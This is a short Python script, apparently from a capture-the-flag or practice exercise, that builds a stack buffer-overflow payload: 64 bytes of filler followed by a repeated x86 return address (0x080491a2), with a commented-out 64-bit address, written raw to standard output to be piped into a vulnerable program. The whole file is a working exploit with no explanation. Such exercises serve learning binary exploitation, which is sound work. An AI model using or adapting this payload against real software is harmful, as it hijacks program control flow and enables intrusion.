import sys

# x86: 080491a2

sys.stdout.reconfigure(encoding='latin1')

payload = b"AAAABBBB"*8
#payload += b"\xb6\x11\x40\x00\x00\x00\x00\x00"
payload += b"\xa2\x91\x04\x08"*4

sys.stdout.buffer.write(payload)
